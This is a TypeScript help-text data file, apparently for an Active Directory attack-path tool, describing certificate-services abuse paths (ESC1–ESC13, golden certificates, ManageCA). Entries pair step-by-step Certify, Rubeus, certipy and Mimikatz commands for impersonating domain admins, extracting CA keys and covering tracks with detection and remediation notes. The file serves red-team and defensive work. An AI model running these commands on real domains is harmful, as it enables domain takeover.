import type { EdgeHelpText } from './types';

export const adAdcsEdges: EdgeHelpText[] = [
  {
    kind: 'ADCSESC1',
    category: 'ADCS',
    general:
      'The ADCSESC1 edge indicates that a principal can abuse a vulnerable certificate template to escalate to domain admin via ESC1 (Subject Alternative Name abuse). The certificate template is vulnerable because it (1) allows the enrollee to supply a Subject Alternative Name (SAN), (2) grants enrollment rights to low-privileged users, (3) has an Extended Key Usage (EKU) that permits client authentication (or any EKU/no EKU), and (4) does not require manager approval. An attacker can request a certificate specifying a high-privileged user (e.g., Domain Admin) in the SAN field, then use that certificate to authenticate as that user via PKINIT or Schannel.',
    windowsAbuse: `# Step 1: Enumerate vulnerable templates using Certify
Certify.exe find /vulnerable

# Step 2: Request a certificate with a SAN specifying a DA
Certify.exe request /ca:CA.domain.local\\domain-CA /template:VulnerableTemplate /altname:administrator

# Step 3: Convert the PEM certificate to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Step 4: Use Rubeus to request a TGT with the certificate
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt

# Alternative: Using the GUI Certificate enrollment snap-in (certmgr.msc)
# Request a certificate, choose the vulnerable template, and manually specify the SAN`,
    linuxAbuse: `# Step 1: Enumerate vulnerable templates using Certipy
certipy find -u attacker@domain.local -p 'Password' -dc-ip 10.0.0.1 -vulnerable

# Step 2: Request a certificate with a SAN specifying a DA
certipy req -u attacker@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local -template VulnerableTemplate -upn administrator@domain.local

# Step 3: Authenticate using the certificate to obtain a TGT and NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1

# Step 4: Use the obtained TGT or NT hash for further access
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass dc.domain.local`,
    opsec:
      'Certificate requests are logged under Event ID 4886 (Certificate Services received a certificate request) and successful issuance under Event ID 4887 (Certificate Services approved a certificate request and issued a certificate) on the CA server. Authentication with a certificate generates Event ID 4768 (A Kerberos authentication ticket was requested) with certificate information in the ticket details. Monitor for certificate requests with SAN values that differ from the requesting principal. The ADCS web enrollment page logs are also valuable. Defenders should audit templates for ENROLLEE_SUPPLIES_SUBJECT flag (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT in msPKI-Certificate-Name-Flag).',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'BloodHound Documentation - ADCSESC1',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-ADCSESC1',
      },
      {
        title: 'Certipy - Active Directory Certificate Services Enumeration and Abuse',
        url: 'https://github.com/ly4k/Certipy',
      },
      {
        title: 'The Hacker Recipes - ESC1',
        url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc1-san-specification',
      },
    ],
  },
  {
    kind: 'ADCSESC3',
    category: 'ADCS',
    general:
      'The ADCSESC3 edge indicates that a principal can abuse the enrollment agent certificate mechanism (ESC3). This is a two-step attack: first, the attacker enrolls in a certificate template that has the Certificate Request Agent EKU (OID 1.3.6.1.4.1.311.20.2.1), which allows the holder to request certificates on behalf of other users. Second, the attacker uses this enrollment agent certificate to co-sign a certificate request for a different template (one that allows enrollment on behalf of others and permits client authentication) specifying a high-privileged user. The result is a certificate for the target user that can be used for PKINIT authentication.',
    windowsAbuse: `# Step 1: Enumerate templates with the Certificate Request Agent EKU
Certify.exe find /enrollmentAgent

# Step 2: Request an enrollment agent certificate
Certify.exe request /ca:CA.domain.local\\domain-CA /template:EnrollmentAgentTemplate

# Step 3: Convert to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out agent.pfx

# Step 4: Use the enrollment agent cert to request a certificate on behalf of a DA
Certify.exe request /ca:CA.domain.local\\domain-CA /template:User /onbehalfof:domain\\administrator /enrollcert:agent.pfx

# Step 5: Authenticate with the obtained certificate
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /ptt`,
    linuxAbuse: `# Step 1: Enumerate templates vulnerable to ESC3
certipy find -u attacker@domain.local -p 'Password' -dc-ip 10.0.0.1 -vulnerable

# Step 2: Request an enrollment agent certificate
certipy req -u attacker@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local -template EnrollmentAgentTemplate

# Step 3: Use the enrollment agent cert to request on behalf of another user
certipy req -u attacker@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local -template User -on-behalf-of 'domain\\administrator' -pfx enrollment_agent.pfx

# Step 4: Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`,
    opsec:
      'Two certificate request events (Event ID 4886/4887) will be generated on the CA: one for the enrollment agent certificate and one for the on-behalf-of request. The second request will show the enrollment agent as the requester with a different subject. Monitor for certificates issued with the Certificate Request Agent EKU, as this is uncommon in most environments. Event ID 4768 will show the final authentication. Defenders should restrict enrollment agent permissions using certificate manager restrictions on the CA.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'BloodHound Documentation - ADCSESC3',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-ADCSESC3',
      },
      {
        title: 'The Hacker Recipes - ESC3',
        url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc3-enrollment-agent',
      },
    ],
  },
  {
    kind: 'ADCSESC4',
    category: 'ADCS',
    general:
      'The ADCSESC4 edge indicates that a principal has dangerous write permissions over a certificate template object in Active Directory, enabling modification of the template to create an ESC1-vulnerable configuration. If the principal has WriteProperty, WriteDacl, WriteOwner, or GenericAll on a certificate template, they can modify the template settings to (1) enable the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag, (2) set an EKU that permits client authentication, and (3) grant themselves enrollment rights. Once modified, the template becomes exploitable via ESC1.',
    windowsAbuse: `# Step 1: Enumerate template ACLs using Certify
Certify.exe find /vulnerable

# Step 2: Modify the template to enable SAN specification
# Using ADSI or PowerShell to set msPKI-Certificate-Name-Flag
$template = [ADSI]"LDAP://CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local"
$template.Put("msPKI-Certificate-Name-Flag", 1)  # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
$template.Put("msPKI-Enrollment-Flag", 0)  # Remove manager approval
$template.SetInfo()

# Step 3: Now exploit as ESC1
Certify.exe request /ca:CA.domain.local\\domain-CA /template:VulnerableTemplate /altname:administrator

# Step 4: Authenticate with the certificate
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt

# Step 5: (Optional) Revert template changes to cover tracks
$template.Put("msPKI-Certificate-Name-Flag", 0)
$template.SetInfo()`,
    linuxAbuse: `# Step 1: Enumerate templates with write permissions
certipy find -u attacker@domain.local -p 'Password' -dc-ip 10.0.0.1 -vulnerable

# Step 2: Modify the template to be vulnerable to ESC1
# Using bloodyAD or ldap3 to modify template attributes
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set object 'CN=VulnerableTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local' --attr msPKI-Certificate-Name-Flag --value 1

# Step 3: Exploit via ESC1
certipy req -u attacker@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local -template VulnerableTemplate -upn administrator@domain.local

# Step 4: Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`,
    opsec:
      'Template modification generates Event ID 5136 (A directory service object was modified) in the Directory Service Changes audit log. The modification of msPKI-Certificate-Name-Flag and other PKI attributes should be closely monitored. After exploitation, certificate request events (4886/4887) and authentication events (4768) are generated as with ESC1. Defenders should audit ACLs on all certificate templates and restrict write permissions to PKI administrators only. Template changes are relatively rare in production and should trigger alerts.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'BloodHound Documentation - ADCSESC4',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-ADCSESC4',
      },
      {
        title: 'Certipy - Template Modification',
        url: 'https://github.com/ly4k/Certipy',
      },
    ],
  },
  {
    kind: 'ADCSESC6a',
    category: 'ADCS',
    general:
      'The ADCSESC6a edge indicates that the EDITF_ATTRIBUTESUBJECTALTNAME2 flag is enabled on the Certificate Authority, making it vulnerable to ESC6. When this flag is set on the CA, ANY certificate request can specify a Subject Alternative Name (SAN) regardless of the template settings. This means even templates that do not have the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag can be exploited to include an arbitrary SAN. An attacker with enrollment rights on any template that allows client authentication can request a certificate with a DA in the SAN field.',
    windowsAbuse: `# Step 1: Check if the CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
Certify.exe cas

# Or using certutil
certutil -config "CA.domain.local\\domain-CA" -getreg policy\\EditFlags

# Step 2: Request a certificate with an arbitrary SAN (works on any template)
Certify.exe request /ca:CA.domain.local\\domain-CA /template:User /altname:administrator

# Step 3: Authenticate with the certificate
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt`,
    linuxAbuse: `# Step 1: Enumerate CAs and check for ESC6
certipy find -u attacker@domain.local -p 'Password' -dc-ip 10.0.0.1 -vulnerable

# Step 2: Request a certificate with an arbitrary SAN
certipy req -u attacker@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local -template User -upn administrator@domain.local

# Step 3: Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`,
    opsec:
      'Certificate requests and issuance generate Event IDs 4886 and 4887 on the CA. The SAN value in the request can be reviewed in the CA database and request logs. Monitor for certificate requests where the SAN UPN does not match the requesting principal. The EDITF_ATTRIBUTESUBJECTALTNAME2 flag state can be audited via certutil. Disabling this flag is the primary remediation — it requires restarting the CertSvc service. Event ID 4768 with certificate authentication will reveal the impersonated identity.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'BloodHound Documentation - ADCSESC6a',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-ADCSESC6',
      },
      {
        title: 'The Hacker Recipes - ESC6',
        url: 'https://www.thehacker.recipes/ad/movement/adcs/ca-configuration#esc6-editf_attributesubjectaltname2',
      },
    ],
  },
  {
    kind: 'ADCSESC6b',
    category: 'ADCS',
    general:
      'The ADCSESC6b edge is a variant of ESC6a. It represents the same underlying vulnerability — the EDITF_ATTRIBUTESUBJECTALTNAME2 flag is enabled on the Certificate Authority — but through a slightly different attack path. In this variant, the attacker may need to use a different certificate template or enrollment method, but the core issue remains: the CA-level flag overrides template-level SAN restrictions, allowing any enrollee to specify an arbitrary Subject Alternative Name. The exploitation and impact are identical to ESC6a.',
    windowsAbuse: `# Step 1: Check if the CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled
Certify.exe cas

# Step 2: Request a certificate specifying an alternate SAN
Certify.exe request /ca:CA.domain.local\\domain-CA /template:User /altname:administrator

# Step 3: Authenticate with the certificate
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt`,
    linuxAbuse: `# Step 1: Enumerate CAs and check for ESC6
certipy find -u attacker@domain.local -p 'Password' -dc-ip 10.0.0.1 -vulnerable

# Step 2: Request a certificate with an arbitrary SAN
certipy req -u attacker@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local -template User -upn administrator@domain.local

# Step 3: Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`,
    opsec:
      'Detection is identical to ESC6a. Event IDs 4886 and 4887 on the CA server log certificate requests and issuance. Monitor for SAN values that do not match the enrollee identity. Event ID 4768 for TGT requests using certificates. Remediation: disable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag using certutil -config "CA\\CA-Name" -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2 and restart the CertSvc service.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'BloodHound Documentation - ADCSESC6b',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-ADCSESC6',
      },
    ],
  },
  {
    kind: 'ADCSESC9a',
    category: 'ADCS',
    general:
      'The ADCSESC9a edge indicates a vulnerability where a certificate template has the CT_FLAG_NO_SECURITY_EXTENSION flag set (msPKI-Enrollment-Flag contains 0x00080000), and the domain controller has StrongCertificateBindingEnforcement set to 0 or 1. When CT_FLAG_NO_SECURITY_EXTENSION is set, the issued certificate does not embed the new szOID_NTDS_CA_SECURITY_EXT security extension (OID 1.3.6.1.4.1.311.25.2) that maps the certificate to a specific AD object. Without this extension, and with weak certificate binding enforcement, an attacker who can modify the UPN of a controlled account (or has GenericWrite on the account) can set the UPN to that of a privileged user, request a certificate, revert the UPN, and authenticate as the privileged user.',
    windowsAbuse: `# Step 1: Enumerate templates with CT_FLAG_NO_SECURITY_EXTENSION
Certify.exe find

# Step 2: Check StrongCertificateBindingEnforcement registry value on the DC
reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc" /v StrongCertificateBindingEnforcement

# Step 3: Modify UPN of a controlled user to match the target
Set-ADUser -Identity controlleduser -UserPrincipalName administrator@domain.local

# Step 4: Request a certificate using the vulnerable template
Certify.exe request /ca:CA.domain.local\\domain-CA /template:VulnerableTemplate

# Step 5: Revert the UPN to avoid detection
Set-ADUser -Identity controlleduser -UserPrincipalName controlleduser@domain.local

# Step 6: Authenticate as the target using the certificate
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt`,
    linuxAbuse: `# Step 1: Enumerate vulnerable templates
certipy find -u attacker@domain.local -p 'Password' -dc-ip 10.0.0.1 -vulnerable

# Step 2: Change the UPN of a controlled account to the target
certipy account update -u attacker@domain.local -p 'Password' -user controlleduser -upn administrator@domain.local

# Step 3: Request a certificate
certipy req -u controlleduser@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local -template VulnerableTemplate

# Step 4: Revert the UPN
certipy account update -u attacker@domain.local -p 'Password' -user controlleduser -upn controlleduser@domain.local

# Step 5: Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`,
    opsec:
      'The UPN change generates Event ID 5136 (A directory service object was modified) on the DC when the userPrincipalName attribute is modified. Certificate request/issuance generates Event IDs 4886/4887. Authentication with the certificate generates Event ID 4768. The UPN change and reversion in quick succession is a strong indicator of this attack. Monitor for rapid attribute modifications followed by certificate enrollment. Remediation: set StrongCertificateBindingEnforcement to 2 (full enforcement) or remove CT_FLAG_NO_SECURITY_EXTENSION from templates.',
    references: [
      {
        title: 'Certipy 4.0 - ESC9 & ESC10',
        url: 'https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-attack-paths-a]nd-more-6a5e974b3e65',
      },
      {
        title: 'BloodHound Documentation - ADCSESC9',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-ADCSESC9',
      },
      {
        title: 'The Hacker Recipes - ESC9',
        url: 'https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#esc9-no-security-extension',
      },
    ],
  },
  {
    kind: 'ADCSESC9b',
    category: 'ADCS',
    general:
      'The ADCSESC9b edge is a variant of ESC9a with the same core vulnerability: the CT_FLAG_NO_SECURITY_EXTENSION flag on a certificate template combined with weak StrongCertificateBindingEnforcement. This variant may involve a different attack path, such as using GenericWrite on a computer account to modify its dNSHostName or servicePrincipalName instead of UPN manipulation on a user account. The certificate issued without the security extension can be used to authenticate as the target computer or user.',
    windowsAbuse: `# Same approach as ESC9a, but may target computer accounts or use different attribute manipulation
# Step 1: Enumerate vulnerable templates
Certify.exe find

# Step 2: If targeting a computer account, modify dNSHostName
Set-ADComputer -Identity controlledcomputer -DNSHostName dc.domain.local

# Step 3: Request a certificate using the vulnerable template
Certify.exe request /ca:CA.domain.local\\domain-CA /template:Machine /machine

# Step 4: Revert the attribute
Set-ADComputer -Identity controlledcomputer -DNSHostName controlledcomputer.domain.local

# Step 5: Authenticate
Rubeus.exe asktgt /user:dc$ /certificate:cert.pfx /ptt`,
    linuxAbuse: `# Step 1: Enumerate vulnerable templates
certipy find -u attacker@domain.local -p 'Password' -dc-ip 10.0.0.1 -vulnerable

# Step 2: Modify dNSHostName of a controlled computer
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set object 'controlledcomputer$' --attr dNSHostName --value dc.domain.local

# Step 3: Request certificate
certipy req -u 'controlledcomputer$'@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local -template Machine

# Step 4: Revert
bloodyAD -d domain.local -u attacker -p 'Password' --host dc.domain.local set object 'controlledcomputer$' --attr dNSHostName --value controlledcomputer.domain.local

# Step 5: Authenticate
certipy auth -pfx dc.pfx -dc-ip 10.0.0.1`,
    opsec:
      'Attribute modifications (dNSHostName, servicePrincipalName) generate Event ID 5136. Certificate events are the same as ESC9a (Event IDs 4886, 4887, 4768). Monitor for dNSHostName changes on computer accounts, which is abnormal outside of domain join operations. The same remediation applies: set StrongCertificateBindingEnforcement to 2 or remove the CT_FLAG_NO_SECURITY_EXTENSION flag.',
    references: [
      {
        title: 'Certipy 4.0 - ESC9 & ESC10',
        url: 'https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-attack-paths-and-more-6a5e974b3e65',
      },
      {
        title: 'BloodHound Documentation - ADCSESC9',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-ADCSESC9',
      },
    ],
  },
  {
    kind: 'ADCSESC10a',
    category: 'ADCS',
    general:
      'The ADCSESC10a edge indicates a weak certificate mapping vulnerability. When the domain controller registry value CertificateMappingMethods includes the UPN mapping flag (0x4, UPN mapping) and StrongCertificateBindingEnforcement is set to 0, the DC maps certificates to accounts using only the SAN UPN field without requiring a strong binding (such as the SID in the certificate security extension). An attacker who can modify the UPN of a controlled account can set it to a privileged user UPN, enroll for a certificate, revert the UPN, and authenticate as the target — the DC will map the certificate to the privileged user based on UPN alone.',
    windowsAbuse: `# Step 1: Check CertificateMappingMethods on the DC
reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\Schannel" /v CertificateMappingMethods

# Step 2: Check StrongCertificateBindingEnforcement
reg query "HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc" /v StrongCertificateBindingEnforcement

# Step 3: Set controlled user UPN to target
Set-ADUser -Identity controlleduser -UserPrincipalName administrator@domain.local

# Step 4: Request certificate
Certify.exe request /ca:CA.domain.local\\domain-CA /template:User

# Step 5: Revert UPN
Set-ADUser -Identity controlleduser -UserPrincipalName controlleduser@domain.local

# Step 6: Authenticate via Schannel (LDAPS) or PKINIT
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt`,
    linuxAbuse: `# Step 1: Enumerate for ESC10 conditions
certipy find -u attacker@domain.local -p 'Password' -dc-ip 10.0.0.1 -vulnerable

# Step 2: Change UPN
certipy account update -u attacker@domain.local -p 'Password' -user controlleduser -upn administrator@domain.local

# Step 3: Request certificate
certipy req -u controlleduser@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local -template User

# Step 4: Revert UPN
certipy account update -u attacker@domain.local -p 'Password' -user controlleduser -upn controlleduser@domain.local

# Step 5: Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1`,
    opsec:
      'Same detection as ESC9: Event ID 5136 for UPN changes, Event IDs 4886/4887 for certificate operations, Event ID 4768 for authentication. The rapid UPN change-enroll-revert pattern is the key detection opportunity. Remediation: set StrongCertificateBindingEnforcement to 2 and ensure CertificateMappingMethods does not include weak mapping methods. KB5014754 enforces strong certificate mapping when fully applied.',
    references: [
      {
        title: 'Certipy 4.0 - ESC9 & ESC10',
        url: 'https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-attack-paths-and-more-6a5e974b3e65',
      },
      {
        title: 'BloodHound Documentation - ADCSESC10',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-ADCSESC10',
      },
      {
        title: 'Microsoft - KB5014754 Certificate-based authentication changes',
        url: 'https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16',
      },
    ],
  },
  {
    kind: 'ADCSESC10b',
    category: 'ADCS',
    general:
      'The ADCSESC10b edge is a variant of ESC10a involving weak certificate mapping. This variant may involve Schannel-based certificate authentication (LDAPS) rather than PKINIT, or may target computer accounts via dNSHostName manipulation rather than user UPN manipulation. The underlying vulnerability is the same: CertificateMappingMethods includes weak mapping flags and StrongCertificateBindingEnforcement is insufficient, allowing certificate-to-account mapping based on easily manipulated attributes.',
    windowsAbuse: `# Similar to ESC10a but may use Schannel authentication
# Step 1: Set controlled user UPN to target
Set-ADUser -Identity controlleduser -UserPrincipalName administrator@domain.local

# Step 2: Request certificate
Certify.exe request /ca:CA.domain.local\\domain-CA /template:User

# Step 3: Revert UPN
Set-ADUser -Identity controlleduser -UserPrincipalName controlleduser@domain.local

# Step 4: Authenticate via Schannel (LDAPS with certificate)
# Use the certificate for LDAPS authentication to the DC`,
    linuxAbuse: `# Step 1: Change UPN
certipy account update -u attacker@domain.local -p 'Password' -user controlleduser -upn administrator@domain.local

# Step 2: Request certificate
certipy req -u controlleduser@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local -template User

# Step 3: Revert UPN
certipy account update -u attacker@domain.local -p 'Password' -user controlleduser -upn controlleduser@domain.local

# Step 4: Authenticate via Schannel
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1 -ldap-shell`,
    opsec:
      'Detection and remediation are identical to ESC10a. Monitor for UPN and dNSHostName attribute changes (Event ID 5136), certificate enrollment (Event IDs 4886/4887), and certificate-based authentication (Event ID 4768 for PKINIT, LDAPS connection logs for Schannel). Apply KB5014754 and set StrongCertificateBindingEnforcement to 2.',
    references: [
      {
        title: 'Certipy 4.0 - ESC9 & ESC10',
        url: 'https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-attack-paths-and-more-6a5e974b3e65',
      },
      {
        title: 'Microsoft - KB5014754 Certificate-based authentication changes',
        url: 'https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16',
      },
    ],
  },
  {
    kind: 'ADCSESC13',
    category: 'ADCS',
    general:
      'The ADCSESC13 edge indicates that a principal can abuse an issuance policy OID linked to a security group (ESC13). In ADCS, issuance policies can be linked to security groups via the msDS-OIDToGroupLink attribute on the OID object in the OID container. When a user enrolls in a certificate template that has this issuance policy, and the CA issues the certificate, the user effectively gains membership in the linked security group for the duration of the certificate-based authentication session. If the linked group is privileged (e.g., Domain Admins), this becomes a privilege escalation path.',
    windowsAbuse: `# Step 1: Enumerate OID-to-group links
# Find OID objects with msDS-OIDToGroupLink set
Get-ADObject -SearchBase "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" -Filter {msDS-OIDToGroupLink -like "*"} -Properties msDS-OIDToGroupLink,displayName

# Step 2: Find certificate templates that use the linked issuance policy
Certify.exe find

# Step 3: Enroll in the template with the linked issuance policy
Certify.exe request /ca:CA.domain.local\\domain-CA /template:PolicyLinkedTemplate

# Step 4: Authenticate — the resulting TGT will include the linked group SID
Rubeus.exe asktgt /user:attacker /certificate:cert.pfx /ptt`,
    linuxAbuse: `# Step 1: Enumerate for ESC13
certipy find -u attacker@domain.local -p 'Password' -dc-ip 10.0.0.1 -vulnerable

# Step 2: Request certificate from the template with OID group link
certipy req -u attacker@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local -template PolicyLinkedTemplate

# Step 3: Authenticate
certipy auth -pfx attacker.pfx -dc-ip 10.0.0.1`,
    opsec:
      'Certificate enrollment generates Event IDs 4886/4887. Authentication with the certificate generates Event ID 4768, and the resulting TGT PAC will contain the linked group SID. This is particularly hard to detect because the user is never actually added to the group in AD — the membership only exists in the Kerberos PAC. Monitor for OID objects with msDS-OIDToGroupLink set, and audit which templates reference those issuance policies. Removing the msDS-OIDToGroupLink attribute from OID objects is the primary remediation.',
    references: [
      {
        title: 'BloodHound Documentation - ADCSESC13',
        url: 'https://support.bloodhoundenterprise.io/hc/en-us/articles/17312347318043-ADCSESC13',
      },
      {
        title: 'SpecterOps - ESC13 Issuance Policy Abuse',
        url: 'https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-3-33efb00856ac',
      },
      {
        title: 'Certipy - ESC13',
        url: 'https://github.com/ly4k/Certipy',
      },
    ],
  },
  {
    kind: 'GoldenCert',
    category: 'ADCS',
    general:
      'The GoldenCert edge indicates that the CA private key can be extracted from the Certificate Authority, enabling the forging of arbitrary certificates. This is the ADCS equivalent of a Golden Ticket — with the CA private key, an attacker can create certificates for any user, with any SAN, any EKU, and any validity period. These forged certificates are indistinguishable from legitimately issued ones and will be trusted by all domain-joined systems. The CA private key is stored in the CA machine certificate store (or in an HSM for hardened deployments).',
    windowsAbuse: `# Step 1: Extract the CA certificate and private key (requires local admin on the CA)
# Using Mimikatz
mimikatz # crypto::capi
mimikatz # crypto::certificates /export /systemstore:LOCAL_MACHINE

# Or using SharpDPAPI to extract from DPAPI
SharpDPAPI.exe certificates /machine

# Or using certutil to export (if key is exportable)
certutil -exportPFX my CA-cert.pfx

# Step 2: Forge a certificate for any user using ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword 'password' --Subject "CN=Administrator,DC=domain,DC=local" --SubjectAltName administrator@domain.local --NewCertPath admin_forged.pfx --NewCertPassword 'password'

# Step 3: Authenticate with the forged certificate
Rubeus.exe asktgt /user:administrator /certificate:admin_forged.pfx /password:password /ptt`,
    linuxAbuse: `# Step 1: If you have access to the CA private key (e.g., from DPAPI dump or backup)
# Extract using certipy (requires local admin on CA or backup access)
certipy ca -backup -u administrator@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local

# Step 2: Forge a certificate for any user
certipy forge -ca-pfx ca.pfx -upn administrator@domain.local -subject 'CN=Administrator,DC=domain,DC=local'

# Step 3: Authenticate with the forged certificate
certipy auth -pfx administrator_forged.pfx -dc-ip 10.0.0.1`,
    opsec:
      'Golden certificates are extremely difficult to detect because they are cryptographically valid — they are signed by the real CA key. No Event ID 4886/4887 is generated because the certificate is forged offline, not requested through the CA. Event ID 4768 (TGT request) with certificate authentication will still be generated, but the certificate will appear legitimate. The primary detection is monitoring CA private key access: Event ID 5058 (Key file operation) and Event ID 5061 (Cryptographic operation) on the CA. Remediation requires revoking the compromised CA certificate and rebuilding the PKI hierarchy — an extremely costly operation.',
    references: [
      {
        title: 'Certified Pre-Owned - Will Schroeder & Lee Christensen (SpecterOps)',
        url: 'https://posts.specterops.io/certified-pre-owned-d95910965cd2',
      },
      {
        title: 'ForgeCert - Certificate Forging Tool',
        url: 'https://github.com/GhostPack/ForgeCert',
      },
      {
        title: 'The Hacker Recipes - Golden Certificate',
        url: 'https://www.thehacker.recipes/ad/persistence/adcs/golden-certificate',
      },
    ],
  },
  {
    kind: 'ManageCA',
    category: 'ADCS',
    general:
      'The ManageCA edge indicates that a principal has the "Manage CA" (CA Administrator) permission on a Certificate Authority. This permission allows the principal to configure the CA, including enabling the EDITF_ATTRIBUTESUBJECTALTNAME2 flag (creating an ESC6 condition), adding the principal as a Certificate Manager (enabling ESC7), modifying CA security settings, and approving pending certificate requests. This is one of the most dangerous ADCS permissions because it provides a path to enable multiple ESC vulnerabilities.',
    windowsAbuse: `# Step 1: Verify ManageCA permission
Certify.exe cas

# Step 2: Enable EDITF_ATTRIBUTESUBJECTALTNAME2 flag (creates ESC6)
certutil -config "CA.domain.local\\domain-CA" -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
# Restart the CA service for the change to take effect
sc \\\\CA.domain.local stop CertSvc
sc \\\\CA.domain.local start CertSvc

# Step 3: Add yourself as Certificate Manager (creates ESC7)
# Using PSPKI module
Import-Module PSPKI
$ca = Get-CertificationAuthority -ComputerName CA.domain.local
Set-CertificationAuthority -InputObject $ca -Officer attacker -Permission ManageCertificates

# Step 4: Now exploit via ESC6 or ESC7
Certify.exe request /ca:CA.domain.local\\domain-CA /template:User /altname:administrator`,
    linuxAbuse: `# Step 1: Enumerate CA permissions
certipy find -u attacker@domain.local -p 'Password' -dc-ip 10.0.0.1

# Step 2: Enable SAN flag on the CA (ESC6)
certipy ca -ca 'domain-CA' -enable-flag EDITF_ATTRIBUTESUBJECTALTNAME2 -u attacker@domain.local -p 'Password'

# Step 3: Or add yourself as officer/certificate manager
certipy ca -ca 'domain-CA' -add-officer attacker -u attacker@domain.local -p 'Password'

# Step 4: Exploit via ESC6
certipy req -u attacker@domain.local -p 'Password' -ca 'domain-CA' -target CA.domain.local -template User -upn administrator@domain.local

# Step 5: Authenticate
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1

# Step 6: (Optional) Disable flag to clean up
certipy ca -ca 'domain-CA' -disable-flag EDITF_ATTRIBUTESUBJECTALTNAME2 -u attacker@domain.local -p 'Password'`,
    opsec:
